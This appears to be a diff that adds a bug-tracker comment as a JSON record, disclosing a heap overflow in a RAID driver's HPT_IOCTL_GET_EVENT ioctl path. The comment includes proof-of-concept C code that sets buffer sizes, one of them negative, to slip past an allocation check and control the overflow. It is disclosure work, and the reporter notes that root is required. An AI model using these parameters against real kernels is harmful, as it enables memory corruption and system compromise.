@@ -1,0 +1,8 @@
+{
+ "id": 861486,
+ "bug_id": 206585,
+ "attachment_id": 0,
+ "creation_time": "2016-01-25T19:38:35Z",
+ "creator": "ecturt@gmail.com",
+ "text": "Supplying the `HPT_IOCTL_GET_EVENT` command will ensure that `Kernel_DeviceIoControl` function instantly returns, resulting in `hpt_set_info` returning straight after doing the `malloc`, `copyin`, and `free`:\n\n\tcase HPT_IOCTL_GET_EVENT:\n\t\t{\n\t\t\tPHPT_EVENT pInfo;\n\n\t\t\tif (nInBufferSize!=0) return -1;\n\nI've also refined the `size` related parameters needed to fully control the heap overflow:\n\n\tparams.dwIoControlCode = HPT_IOCTL_GET_EVENT;\n\tparams.lpInBuffer = mapping;\n\tparams.nInBufferSize = bufferSize + overflowSize;\n\tparams.lpOutBuffer = NULL;\n\tparams.nOutBufferSize = -overflowSize;\n\tparams.lpBytesReturned = \u0026bytesReturned;\n\t\n\tprintf(\"  [+] nInBufferSize (size copied in): %08x\\n\", params.nInBufferSize);\n\tprintf(\"  [+] nOutBufferSize: %08x\\n\", params.nOutBufferSize);\n\tprintf(\"  [+] Sum (allocation size): %08x\\n\", params.nInBufferSize + params.nOutBufferSize);\n\tprintf(\"  [+] Will be accepted: %d\\n\", (params.nInBufferSize + params.nOutBufferSize) \u003c= PAGE_SIZE);\n\nYou can get very manageable sizes from this, for example, allocated `bufferSize` of `0x500`, and copy size of `0x1000`.\n\nI'll try to get around to writing a full exploit for this soon, but won't be very useful since the vulnerability is only triggerable as `root` anyway."
+}
